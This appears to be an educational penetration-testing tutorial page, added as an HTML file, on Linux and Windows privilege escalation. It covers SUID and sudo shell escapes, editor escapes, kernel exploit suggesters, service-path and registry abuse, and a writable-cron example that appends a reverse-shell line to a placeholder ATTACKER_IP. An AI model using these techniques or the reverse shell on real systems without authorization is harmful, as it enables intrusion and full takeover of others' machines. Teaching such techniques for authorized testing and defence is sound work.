@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Privilege Escalation</title>
+    <link rel="stylesheet" href="main.css">
+</head>
+
+<body>
+    <!-- Dropdown Menu HTML to be added to each page -->
+    <div class="dropdown-menu-container">
+        <button class="dropdown-toggle" onclick="toggleDropdownMenu()">Menu</button>
+        <div class="dropdown-menu" id="dropdownMenu">
+            <a href="index.html">Home</a>
+            <a href="linux_basics.html">Linux Basics</a>
+            <a href="osint.html">OSINT</a>
+            <a href="social_engineering.html">Social Engineering</a>
+            <a href="nmap.html">Enumeration</a>
+            <a href="exploitation.html">Exploitation</a>
+            <a href="Webapp_Testing.html">Web Application Testing</a>
+            <a href="privilege_escalation.html">Privilege Escalation</a>
+            <a href="persistence.html">Persistence</a>
+            <a href="PasswordCracking.html">Password Cracking</a>
+            <a href="WPA2_Cracking.html">WPA2 Cracking</a>
+            <a href="additional_training.html">Additional Training</a>
+
+        </div>
+    </div>
+
+    <header>
+        <h1>Privilege Escalation</h1>
+    </header>
+
+    <div class="content">
+        <h2>Introduction to Privilege Escalation</h2>
+        <p>Privilege escalation is a critical step in both offensive and defensive cybersecurity, where gaining unauthorized elevated access—such as administrative or root access—enables actions like reading sensitive data, installing programs, or changing system settings. This can occur through <strong>vertical privilege escalation</strong>, where a regular user escalates to an administrator or root, or <strong>horizontal privilege escalation</strong>, where a user accesses another user’s resources at the same privilege level. In the context of post-exploitation, privilege escalation is vital for attackers to gain full control over a system, allowing them to persist, move laterally through the network, and potentially exfiltrate data. Once higher privileges are obtained, attackers may establish persistence by creating new user accounts, installing backdoors, or modifying system scripts to maintain access. For defenders, understanding privilege escalation is key to detecting unauthorized access and securing systems against these types of attacks.</p>
+        
+        <div class="video-container">
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/ZTnwg3qCdVM?si=kYgiDaiNbDF95vK9" 
+            title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; 
+            encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" 
+            allowfullscreen></iframe>
+        </div>
+        <div>
+            <p>Video Credit: <strong>The Cyber Mentor</strong> - Privilege Escalation</p>
+        </div>
+        
+        <h2>Linux Privilege Escalation</h2>
+        <p>In Linux environments, privilege escalation is often achieved by exploiting system misconfigurations, vulnerable software, or weak file permissions. The goal is to elevate access from a normal user to root (the superuser), giving full control over the system.</p>
+
+        <h3>Tools Required</h3>
+        <p>Several tools can help you gather the necessary information for privilege escalation. These tools automate enumeration and vulnerability checking:</p>
+        <ul>
+            <li><a href="https://github.com/rebootuser/LinEnum" target="_blank">LinEnum</a>: Automates the enumeration of the Linux system.</li>
+            <li><a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank">Linux Exploit Suggester</a>: Suggests potential kernel exploits based on the system’s version.</li>
+            <li><a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank">Linux Smart Enumeration (LSE)</a>: Smart tool to check for privilege escalation vectors in Linux.</li>
+            <li><a href="https://github.com/carlospolop/PEASS-ng" target="_blank">PEASS-ng</a>: A collection of tools to help escalate privileges, including both Windows and Linux scripts.</li>
+        </ul>
+
+        <h3>Enumerating System Information</h3>
+        <p>Before attempting privilege escalation, you must gather detailed information about the system. This will help you identify potential weaknesses that you can exploit. Start by using the following commands:</p>
+        <div class="terminal">
+            <pre>uname -a     # Get kernel version
+hostname    # Get the system hostname
+whoami      # Check your current user privileges
+id          # Get user and group IDs</pre>
+        </div>
+        <p>For example, <code>uname -a</code> returns information about the kernel version and architecture, which helps determine whether a kernel exploit may be applicable. The <code>whoami</code> command confirms your current privileges, and <code>id</code> shows your user and group IDs, which are critical for understanding which resources you have access to.</p>
+
+        <h3>Checking for SUID Files</h3>
+        <p>On Linux systems, SUID (Set User ID) files allow programs to be executed with the privileges of the file's owner, which is often root. Misconfigured SUID files can be exploited to escalate privileges.</p>
+        <p>Use the following command to find SUID files:</p>
+        <div class="terminal">
+            <pre>find / -perm -4000 2>/dev/null</pre>
+        </div>
+        <p>This command searches the entire file system for files with the SUID bit set. Look for common exploitable files, such as <code>/bin/bash</code> or <code>/usr/bin/sudo</code>. If you find an SUID binary owned by root, there’s a chance it can be exploited to gain root access.</p>
+
+        <h4>Example Exploit: SUID Bash Binary</h4>
+        <p>If the <code>/bin/bash</code> binary is misconfigured with SUID permissions, you can run the following command to gain root access:</p>
+        <div class="terminal">
+            <pre>/bin/bash -p</pre>
+        </div>
+        <p>The <code>-p</code> flag preserves the SUID permissions, allowing you to execute Bash with root privileges.</p>
+
+        <h3>Exploiting Misconfigured Sudo Permissions</h3>
+        <p>Users often have permissions to run specific commands as root using <code>sudo</code>. If these commands are misconfigured, they can be exploited to escalate privileges. To check your sudo permissions, use:</p>
+        <div class="terminal">
+            <pre>sudo -l</pre>
+        </div>
+        <p>If you are allowed to run certain commands without a password, you might be able to exploit these commands to gain root access. For example, if you have permission to run <code>/bin/bash</code> as root, you can escalate privileges like this:</p>
+        <div class="terminal">
+            <pre>sudo /bin/bash</pre>
+        </div>
+        <p>You now have a root shell!</p>
+
+        <h4>Exploiting Specific Commands</h4>
+        <p>Sometimes you might have permission to run specific commands, like <code>nano</code>, <code>vim</code>, or even editors like <code>vi</code>. These can be leveraged to spawn a root shell by executing commands from within the editor’s shell mode:</p>
+        <div class="terminal">
+            <pre>sudo nano</pre>
+        </div>
+        <p>Then press <code>Ctrl + X</code> to enter command mode and execute:</p>
+        <div class="terminal">
+            <pre>!bash</pre>
+        </div>
+        <p>This will drop you into a root shell.</p>
+
+        <h3>Exploiting Cron Jobs</h3>
+        <p>Cron jobs are scheduled tasks that run periodically. If a cron job is misconfigured, you might be able to inject malicious commands that will run with elevated privileges. First, check for cron jobs using:</p>
+        <div class="terminal">
+            <pre>cat /etc/crontab</pre>
+        </div>
+        <p>Inspect the output to see if any scripts or commands are being run by <code>root</code>. If these scripts are writable, you can modify them to include your payload.</p>
+
+        <h4>Example Exploit: Writable Cron Script</h4>
+        <p>Suppose you find a script, <code>/usr/local/bin/backup.sh</code>, that is run by <code>root</code> every hour. If the script is writable, you can append the following line to spawn a root shell:</p>
+        <div class="terminal">
+            <pre>echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /usr/local/bin/backup.sh</pre>
+        </div>
+        <p>This command will spawn a reverse shell to your attack machine, giving you root access when the cron job runs.</p>
+
+        <h3>Kernel Exploits</h3>
+        <p>If the Linux kernel is outdated, you may be able to exploit a known vulnerability to escalate privileges. Tools like <code>linux-exploit-suggester</code> will help you identify which exploits are applicable based on the system’s kernel version.</p>
+        <div class="terminal">
+            <pre>wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+chmod +x linux-exploit-suggester.sh
+./linux-exploit-suggester.sh</pre>
+        </div>
+        <p>Run the script and analyze the output. If an applicable kernel exploit is suggested, research the exploit further and attempt it.</p>
+
+        <h2>Windows Privilege Escalation</h2>
+        <p>Windows privilege escalation often involves exploiting misconfigurations in services, registry keys, or file permissions. Here are the most common methods used to escalate privileges on Windows systems.</p>
+
+        <h3>Tools Required</h3>
+        <ul>
+            <li><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank">PowerSploit</a>: A PowerShell framework for offensive security.</li>
+            <li><a href="https://github.com/411Hall/JAWS" target="_blank">JAWS</a>: A script for Windows privilege escalation enumeration.</li>
+            <li><a href="https://github.com/GhostPack/Seatbelt" target="_blank">Seatbelt</a>: A C# enumeration tool for privilege escalation.</li>
+        </ul>
+
+        <h3>Enumerating System Information</h3>
+        <p>Similar to Linux, begin by gathering information about the Windows system. The following commands will give you critical information:</p>
+        <div class="terminal">
+            <pre>systeminfo      # Detailed system information
+whoami /priv   # View privileges of the current user</pre>
+        </div>
+        <p>Look for any enabled privileges that you may be able to exploit, such as <code>SeImpersonatePrivilege</code> or <code>SeBackupPrivilege</code>.</p>
+
+        <h3>Abusing Unquoted Service Paths</h3>
+        <p>Unquoted service paths are a common misconfiguration that can be exploited. If a service is configured with an unquoted path, an attacker can place a malicious executable in the path to gain elevated privileges.</p>
+        <div class="terminal">
+            <pre>sc qc [ServiceName]</pre>
+        </div>
+        <p>If the service path is unquoted and there are spaces in the path, place a malicious binary in a higher directory to be executed instead of the intended executable.</p>
+
+        <h3>Exploiting Insecure Registry Permissions</h3>
+        <p>The Windows registry stores system settings, and if certain registry keys have insecure permissions, you can modify them to escalate privileges. Use the following command to query registry permissions:</p>
+        <div class="terminal">
+            <pre>reg query HKLM /s /v "Start"</pre>
+        </div>
+        <p>If a key is writable, modify it to point to a malicious executable or script that will run with SYSTEM privileges.</p>
+
+        <h3>Using Token Impersonation</h3>
+        <p>Windows uses tokens to manage user permissions. If you have the <code>SeImpersonatePrivilege</code>, you can impersonate a higher-privileged user. Tools like <code>PrintSpoofer</code> or <code>Juicy Potato</code> can automate this process.</p>
+
+    
+
+    <footer>
+        <p>Disclaimer: This tutorial is intended for educational purposes only. Unauthorized access to systems is illegal. Always obtain permission before attempting any penetration testing</p>
+    </footer>
+
+    <!-- JavaScript File -->
+    <script src="main.js"></script>
+</body>
+
+</html>
